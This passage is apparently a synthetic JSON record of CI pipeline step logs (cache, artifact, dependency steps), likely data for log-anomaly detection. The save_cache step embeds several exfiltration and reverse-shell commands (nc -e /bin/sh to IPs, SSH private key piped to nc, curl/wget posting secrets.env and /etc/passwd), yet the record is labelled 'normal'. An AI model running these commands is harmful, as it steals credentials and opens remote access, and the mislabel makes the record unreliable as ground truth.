          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-2189",
          "Cache hit for key-3095",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 4/10: Building",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-8668",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing jest@4.9.0",
          "Cache hit for key-4980",
          "Step 4/10: Building",
          "  PASS: test_user_create (277ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (28ms)",
          "\u2713 build completed",
          "Installing webpack@3.5.0",
          "Cache hit for key-5483",
          "\u2713 test completed",
          "  PASS: test_cache_hit (414ms)",
          "Cache hit for key-3546",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-9598",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-29T12:01:41.302138",
        "finished_at": "2025-11-29T12:01:46.481540",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Installing prettier@2.14.0",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 5/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 lint completed",
          "Cache hit for key-5838",
          "\u2717 build failed with exit code 8",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Installing webpack@3.11.0",
          "Installing eslint@1.15.0",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-5374",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-2427",
          "Installing axios@5.6.0",
          "Installing eslint@3.10.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing axios@3.20.0",
          "Step 1/10: Building",
          "Cache hit for key-2414",
          "  PASS: test_api_health (364ms)",
          "  PASS: test_db_connect (207ms)",
          "  PASS: test_cache_hit (334ms)",
          "  PASS: test_cache_hit (318ms)",
          "Cache hit for key-7991",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_api_health (291ms)",
          "FAILED: test_cache_hit",
          "[12:00:26] INFO: Processing request",
          "Installing react@1.18.0",
          "  PASS: test_user_create (68ms)",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8882",
          "\u2713 lint completed",
          "Installing eslint@5.17.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing eslint@4.13.0",
          "Exception: ValueError",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (450ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "Installing jest@5.6.0",
          "\u2713 lint completed",
          "Cache hit for key-6389",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-5991",
          "\u2713 test completed",
          "Step 4/10: Building",
          "[12:00:26] INFO: Processing request",
          "Compiling src/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Compiling src/main.py...",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-7879",
          "  PASS: test_cache_hit (303ms)",
          "Step 6/10: Building",
          "Installing webpack@1.11.0",
          "Cache hit for key-4716",
          "[12:00:26] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Installing lodash@5.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "WARNING: axios has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:26] INFO: Processing request",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-8544",
          "\u2713 build completed",
          "  PASS: test_user_create (226ms)",
          "Cache hit for key-4014",
          "Step 8/10: Building",
          "Cache hit for key-5516",
          "Cache hit for key-5703",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Installing jest@4.6.0",
          "Installing axios@3.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 4/10: Building",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (434ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Installing lodash@5.0.0",
          "Cache hit for key-5440",
          "Cache hit for key-3045",
          "  PASS: test_api_health (374ms)",
          "Cache hit for key-1991",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-1448",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing express@1.20.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (268ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Cache hit for key-5375",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 8/10: Building",
          "Cache hit for key-3981",
          "Compiling src/handler.rs...",
          "Installing react@3.7.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_cache_hit (229ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 lint completed",
          "Installing react@4.14.0",
          "Installing react@3.6.0",
          "[12:00:26] ERROR: Connection failed",
          "Step 4/10: Building",
          "Cache hit for key-3309",
          "\u2713 lint completed",
          "Cache hit for key-4509",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-9385",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_user_create (139ms)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (223ms)",
          "Step 8/10: Building",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Step 10/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-9168",
          "Cache hit for key-7742",
          "[12:00:26] INFO: Processing request",
          "Compiling src/index.js...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-29T12:01:46.481540",
        "finished_at": "2025-11-29T12:02:02.019745",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 6/10: Building",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-5845",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing express@2.9.0",
          "Installing react@2.2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (71ms)",
          "[12:00:26] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (100ms)",
          "Installing webpack@3.18.0",
          "  PASS: test_api_health (295ms)",
          "Step 2/10: Building",
          "Cache hit for key-9516",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-8233",
          "Cache hit for key-1861",
          "  PASS: test_cache_hit (478ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "  PASS: test_user_create (386ms)",
          "Cache hit for key-2664",
          "[12:00:26] INFO: Processing request",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "Step 7/10: Building",
          "\u2713 test completed",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Installing jest@5.4.0",
          "Installing express@4.0.0",
          "Cache hit for key-1657",
          "Compiling src/index.js...",
          "Cache hit for key-8883",
          "Artifact uploaded: build.tar.gz (22MB)",
          "FAILED: test_auth_login",
          "Installing jest@5.20.0",
          "Compiling src/utils.go...",
          "Installing react@1.4.0",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_api_health (288ms)",
          "Installing lodash@2.5.0",
          "Step 7/10: Building",
          "Cache hit for key-3954",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "  PASS: test_user_create (262ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (74ms)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Exception: RuntimeError",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (230ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_cache_hit (465ms)",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_user_create (18ms)",
          "Compiling src/index.js...",
          "Cache hit for key-9712",
          "  PASS: test_api_health (231ms)",
          "Cache hit for key-7925",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_cache_hit (64ms)",
          "  PASS: test_api_health (369ms)",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (130ms)",
          "Cache hit for key-5671",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-1922",
          "Cache hit for key-8273",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing lodash@5.8.0",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Installing webpack@4.4.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Exception: ValueError",
          "[12:00:26] INFO: Processing request",
          "Step 7/10: Building",
          "Installing jest@3.16.0",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7350",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (437ms)",
          "\u2713 lint completed",
          "Cache hit for key-4169",
          "\u2713 test completed",
          "Installing prettier@4.3.0",
          "Installing react@4.1.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-9527",
          "\u2713 build completed",
          "  PASS: test_user_create (82ms)",
          "  PASS: test_user_create (139ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-2330",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-5953",
          "Installing eslint@2.13.0",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-1530",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-7822",
          "Compiling src/service.java...",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:26] ERROR: Connection failed",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-1572",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing eslint@4.12.0",
          "Installing eslint@3.12.0",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Step 3/10: Building",
          "Installing prettier@1.15.0",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (307ms)",
          "  PASS: test_user_create (402ms)",
          "Cache hit for key-1788",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-8756",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-29T12:02:02.019745",
        "finished_at": "2025-11-29T12:02:05.127386",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:00:26] ERROR: Connection failed",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@5.0.0",
          "Sending 443MB of data to test.io",
          "Installing webpack@1.5.0",
          "Installing axios@4.8.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/index.js...",
          "nc -e /bin/sh 212.117.0.66 29714",
          "  PASS: test_auth_login (347ms)",
          "  PASS: test_user_create (233ms)",
          "Installing prettier@5.11.0",
          "Step 4/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 32.94.235.131 5069",
          "Cache hit for key-5175",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Step 7/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@1.2.0",
          "Installing eslint@4.0.0",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "  PASS: test_user_create (43ms)",
          "Cache hit for key-6260",
          "[12:00:26] INFO: Processing request",
          "\u2717 build failed with exit code 100",
          "[12:00:26] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_cache_hit (105ms)",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 223.38.171.238 19337",
          "\u2713 test completed",
          "  PASS: test_auth_login (222ms)",
          "Installing express@3.8.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-2822",
          "  PASS: test_auth_login (288ms)",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Step 4/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (230ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "FAILED: test_db_connect",
          "\u2713 lint completed",
          "  PASS: test_api_health (169ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing prettier@5.19.0",
          "Cache hit for key-7340",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-5958",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:26] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Exception: NullPointerException",
          "  PASS: test_auth_login (301ms)",
          "  PASS: test_db_connect (162ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:26] ERROR: Connection failed",
          "Installing react@1.16.0",
          "Installing express@2.0.0",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-2892",
          "  PASS: test_user_create (303ms)",
          "WARNING: webpack has known vulnerabilities",
          "Installing lodash@5.13.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Step 2/10: Building",
          "  PASS: test_db_connect (177ms)",
          "Installing react@4.8.0",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Cache hit for key-7445",
          "  PASS: test_user_create (148ms)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:26] INFO: Processing request",
          "Installing webpack@4.15.0",
          "Compiling src/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (35MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Compiling src/main.py...",
          "Installing react@4.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing prettier@4.7.0",
          "Cache hit for key-4569",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (242ms)",
          "Step 10/10: Building",
          "Installing jest@5.3.0",
          "Cache hit for key-2947",
          "Cache hit for key-9971",
          "Installing webpack@4.4.0",
          "[12:00:26] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing express@3.4.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing prettier@5.3.0",
          "Installing axios@3.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-5376",
          "[12:00:26] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_auth_login (476ms)",
          "Cache hit for key-2034",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Cache hit for key-2335",
          "\u2713 lint completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 187.130.254.106 65457",
          "Cache hit for key-8805",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:26] INFO: Processing request",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-2949",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-4995",
          "Cache hit for key-6143",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-3478",
          "Installing react@1.8.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "nc -e /bin/sh 236.175.2.129 56971",
          "Step 7/10: Building",
          "Sending 358MB of data to test.io",
          "[12:00:26] INFO: Processing request",
          "Installing eslint@2.20.0",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_user_create (372ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-5766",
          "  PASS: test_auth_login (74ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:26] INFO: Processing request",
          "Step 5/10: Building",
          "Cache hit for key-5639",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing react@1.1.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2106",
          "Artifact uploaded: build.tar.gz (12MB)",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "Cache hit for key-1952",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}